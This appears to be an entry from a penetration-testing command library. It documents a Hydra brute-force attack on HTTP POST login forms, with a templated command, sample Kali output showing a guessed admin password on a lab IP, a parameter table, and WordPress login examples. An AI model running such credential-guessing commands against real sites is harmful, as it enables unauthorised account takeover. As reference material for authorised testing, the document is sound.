---
id: 520b3767-478c-4a10-8467-b33009caaf2c
type: command
executor: bash
data: >-
  hydra -L $_USERNAME_LIST -P $_PASSWORD_LIST $_TARGET http-post-form
  '$_PATH:$_POST_DATA:$_NEGATIVE_RESULT'
output: >-
  root@kali:~# hydra -L users.txt -P wordlist.txt 10.10.10.10  http-post-form
  '/wp-login.php:log=^USER^&pwd=^PASS^&rememberme=forever&wp-submit=Log+In:incorrect'

  Hydra v9.5 (c) 2023 by van Hauser/THC - Please do not use in military or
  secret service organizations, or for illegal purposes (this is educational).


  [80][http-post-form] host: 10.10.10.10   login: admin   password: secret!!!

  1 of 1 target successfully completed, 1 valid password found

  None of the login-names found on first pass will be tested again.

  All 1 targets completed.
created_at: '2019-09-25T02:38:27.477012+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
tags:
  - brute-force
  - web
verified: true
validated: true
---

# hydra-brute-force-http-post-form

## Command

```bash
hydra -L $_USERNAME_LIST -P $_PASSWORD_LIST $_TARGET http-post-form '$_PATH:$_POST_DATA:$_NEGATIVE_RESULT'
```

## Description

Brute-forces HTTP POST-based login forms by submitting username/password combinations and identifying success when the specified failure string (e.g., 'incorrect') is not present in the response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -L $_USERNAME_LIST | Path to file containing usernames | Yes |
| -P $_PASSWORD_LIST | Path to file containing passwords | Yes |
| $_TARGET | Target IP address or hostname | Yes |
| http-post-form | Module for brute-forcing HTTP POST forms | Yes |
| $_PATH | URL path to the login form (e.g., /wp-login.php) | Yes |
| $_POST_DATA | POST body format with ^USER^ and ^PASS^ placeholders (e.g., log=^USER^&pwd=^PASS^) | Yes |
| $_NEGATIVE_RESULT | String indicating login failure (e.g., 'incorrect') | Yes |
| -t | Number of parallel tasks (default: 16) | No |
| -V | Verbose output | No |

## Examples

### Basic Usage

```bash
hydra -L users.txt -P pass.txt 10.10.10.10 http-post-form '/login: user=^USER^&pass=^PASS^:error'
```

### WordPress Login Brute Force

```bash
hydra -t 16 -L users.txt -P wordlist.txt 10.10.10.10 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&rememberme=forever&wp-submit=Log+In:incorrect'
```

## Expected Output

Valid credentials are reported as: [80][http-post-form] host: 10.10.10.10   login: admin   password: secret!!!
Followed by a summary of successful completions.

## Related

- [[tools/Hydra]]
- [[procedures/Brute-Force-Web-Login-Form-with-Hydra]]
